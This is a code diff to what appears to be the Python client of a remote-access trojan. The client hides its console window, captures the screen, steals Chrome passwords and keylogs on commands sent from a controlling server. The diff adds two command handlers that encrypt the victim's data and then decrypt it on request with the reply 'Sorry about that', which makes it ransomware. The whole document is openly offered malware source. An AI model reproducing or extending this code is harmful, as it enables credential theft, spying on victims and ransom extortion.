@@ -7,6 +7,7 @@ import passwords, keylog
 import base64
 from PIL import ImageGrab
 from packet import Packet
+from encryption import encrypt,decrypt
 
 def hide():
     import win32console,win32gui
@@ -45,6 +46,10 @@ class Client:
                     threading.Thread(target=self.passwords,args=[pkt]).start()
                 elif pkt.state == "145":
                     threading.Thread(target=self.keylog,args=[pkt]).start()
+                elif pkt.state == "146":
+                    threading.Thread(target=self.encrypt,args=[pkt]).start()
+                elif pkt.state == "147":
+                    threading.Thread(target=self.decrypt,args=[pkt]).start()
                 else:
                     print "i don't know that command"
 
@@ -82,8 +87,22 @@ class Client:
             self.enqueue(pkt)
 
     def encrypt(self,pkt):
-        #TODO: Fill this in
-        return
+        data = encrypt()
+        if data != "already encrypted":
+            pkt.data = data
+            pkt.length = len(data)
+        else:
+            pkt.data = "nope"
+            pkt.length = 4
+        
+        self.enqueue(pkt)
+
+    def decrypt(self,pkt):
+        if pkt.data != "":
+            decrypt(pkt.data)
+            pkt.data = "There you go! Sorry about that."
+            pkt.length = len(pkt.data)
+            self.enqueue(pkt)
 
     def passwords(self,pkt):
         message = passwords.getChromePasswords()
